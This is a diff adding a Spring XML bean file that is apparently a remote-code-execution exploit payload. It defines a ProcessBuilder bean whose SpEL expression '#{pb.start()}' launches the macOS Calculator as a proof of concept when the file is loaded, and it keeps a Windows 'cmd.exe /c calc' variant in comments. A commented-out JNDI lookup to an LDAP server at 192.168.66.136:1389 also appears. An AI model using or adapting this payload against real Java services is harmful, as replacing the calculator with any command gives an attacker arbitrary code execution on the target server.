@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+                        http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+<!--                <value>cmd.exe</value>-->
+<!--                <value>/c</value>-->
+<!--                <value><![CDATA[ calc ]]></value>-->
+                <value>/System/Applications/Calculator.app/Contents/MacOS/Calculator</value>
+            </list>
+        </constructor-arg>
+        <property name="any" value="#{pb.start()}"/>
+    </bean>
+    <!--	<bean class="javax.naming.InitialContext" factory-method="doLookup">-->
+    <!--		<constructor-arg type="java.lang.String" value="ldap://192.168.66.136:1389/9wbfcp"/>-->
+    <!--	</bean>-->
+</beans>
